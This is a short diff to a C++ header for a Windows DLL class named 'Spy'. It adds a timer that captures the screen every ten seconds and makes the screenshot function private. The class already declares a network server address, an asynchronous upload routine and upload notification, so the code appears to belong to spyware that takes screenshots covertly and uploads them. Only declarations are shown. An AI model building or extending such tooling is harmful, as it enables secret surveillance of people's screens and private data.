@@ -33,6 +33,7 @@
 #define SPY_IO_IN_SZBUFFER				1024
 #define SPY_NET_SERVER_ADDR				"localhost"
 #define SPY_NET_SERVER_PORT				2512
+#define SPY_TMR_CAPSCR_INTERVAL			(10 * 1000) /* capture screen each...(milliseconds) */
 
 #define EXPORT __declspec(dllexport)
 #define ADD_FLAG(state, flag) {state |= flag;}
@@ -46,18 +47,21 @@
 
 typedef unsigned char byte;
 
+class Timer;
+
 class Spy
 {
 	static HANDLE mutex;
+	static Timer * scrot_timer;
 	static void lock();
 	static void unlock();
 	static void get_temp_fname(char * buffer, int l);
 	static void path_combine(char * dst, const char * dir, const char * fname);
 	static DWORD upload_async(LPVOID * dir_path);
+	static void take_screenshot();
 public:
 	static DWORD load(HINSTANCE hinstance);
 	static void unload();
 	static void get_temp_fpath(char * buffer, const char * fname = NULL);
-	static void take_screenshot();
 	static void notify_upload();
 };
